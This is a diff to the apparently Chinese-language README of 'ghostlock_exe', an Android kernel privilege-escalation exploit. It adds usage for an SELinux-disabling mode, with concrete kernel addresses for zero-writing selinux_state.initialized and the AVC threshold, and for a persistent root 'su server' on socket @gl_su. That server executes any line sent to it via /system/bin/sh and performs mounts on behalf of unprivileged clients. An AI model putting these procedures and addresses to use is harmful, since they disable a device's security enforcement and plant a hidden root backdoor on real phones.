@@ -298,6 +298,9 @@ make                      # NDK r29 / host clang；LOGCAT=1（logcat）默认
 # 示例组合
 ./ghostlock_exe --verify-write --attempts 5 --no-rt --hold
 ./ghostlock_exe --root --no-rt --attempts 4              # 提权 + 4755 端局自检
+./ghostlock_exe --selinux-relax --no-rt --attempts 4     # SELinux 放行（真机路线）
+./ghostlock_exe --su-selftest --no-rt --attempts 4       # su 通道自检（QEMU 可跑）
+./ghostlock_exe --su-server --no-rt --attempts 4         # 常驻 root 服务（真机）
 ./ghostlock_exe --verify-all --probe-cycle \
                 --kaslr-base 0xffffff8008080800 \
                 --log-file /data/local/tmp/gl.log      # QEMU/nokaslr
@@ -307,8 +310,53 @@ make                      # NDK r29 / host clang；LOGCAT=1（logcat）默认
 `--wait-seconds N`、`--requeue-ms N`、`--no-rt`、`--rt-prio N`、
 `--probe-cycle`（kernel.patched/QEMU 必需）、`--noconsume`、`--hold`、
 `--detach`、`--fsync`、`--verify-write`、`--verify-leaf`、`--verify-read`、
-`--verify-all`、`--escalate`、`--bench N`、`--root`、`--harden`。**环境变量已
+`--verify-all`、`--escalate`、`--bench N`、`--root`、`--harden`、
+`--selinux-relax`、`--su-server`、`--su-selftest`、`--rsh CMD`、
+`--shell PATH`、`--serve-count N`、`--slot-file PATH`。**环境变量已
 全部移除**（含旧 `GOT_*` 实验开关）。
+
+### fake-lock 槽位账本（跨进程）
+
+每次 walk 消耗 `empty_zero_page` 的一个 0x20 槽（共 128 个），槽用过后
+`waiters.root/leftmost` 会残留指向本次 waiter，**同一 boot 内不可复用**。
+槽号记在 `/data/local/tmp/gl.slot`（以 `boot_id` 为界：重启后归零），所以
+多进程、多 group 运行不会从 0 重新开始撞上脏槽；耗尽时干净报错而不是
+回绕（回绕会触发 `BUG_ON(w->lock != lock)`）。`--slot-file ""` 可关闭该
+账本（仅单进程场景）。
+
+### SELinux（真机路线，静态分析已定）
+
+本内核 `CONFIG_SECURITY_SELINUX_DEVELOP` 未开：`selinux_state` 里**没有**
+`enforcing` 字段，`/sys/fs/selinux/enforce` 读路径编译成常量 1（上游行为，
+不是华为桩）。一键放行点是 `selinux_state.initialized`：
+
+| 目标 | 链接地址 | 写 | 效果 |
+|---|---|---|---|
+| `selinux_state.initialized`（+2） | `0xffffff800c3b3002` | leaf 零写 | `security_compute_av()` 直接 `allowed=0xffffffff`，所有检查放行 |
+| `avc_cache.avc_cache_threshold` | `0xffffff800b79c388` | leaf 零写 | AVC 自清空（否则历史 deny 缓存仍然拒绝） |
+
+顺序：提权 → 备份 `cat /sys/fs/selinux/policy` → `--selinux-relax`
+（两个叶写）→ 用已知会被拒的操作验证。注意：任何策略重载
+（`/sys/fs/selinux/load`）都会把 `initialized` 置回 1，需要重新执行。
+mrx 风格的 `policydb.permissive_map` 备选地址：node=`0xffffff800b7a1220`、
+highbit=`0xffffff800b7a1228`（注意它按 **type** 而非 SID 置位，且写原语
+写不出任意小整数 startbit，一般不如 `initialized` 路线）。`--selinux-relax`
+在 QEMU 里只能证明两个叶写落地（guest 无策略），语义效果需真机确认。
+
+### 常驻 root 通道（su server / broker，mrx-w09 移植）
+
+`--su-server`：先提权，然后在抽象 UNIX socket `@gl_su` 上常驻（`--serve-count N`
+限制请求数，0 = 无限）。请求行协议：
+
+- `STATUS` / `GLCAP` → uid/euid/gid/egid、CapEff/CapPrm、SELinux context
+- `GLMOUNT|src|tgt|fstype|flags_hex|data`（`-` = NULL）→ 在 root 进程里 mount
+- `GLUMOUNT|tgt|flags` → umount2
+- 其它任何一行 → `/system/bin/sh -c <行>`（`--shell PATH` 可换）
+
+客户端：`--rsh 'CMD'`（未提权进程即可用）。服务进程**永不退出**（退出会走
+悬空 `pi_blocked_on` 的 exit walk）。QEMU 无 shell，`--su-selftest` 自测
+只覆盖 STATUS/GLCAP/GLMOUNT/GLUMOUNT（足以证明 root cred 在 fork + socket
+往返中保持）。
 
 QEMU 以本程序做 /init 时注意：内核没有控制台，fd 0/1/2 可能未打开，
 需在 wrapper 里先补上可用 fd（否则 `pipe()` 会占用 fd 0/1，子进程的
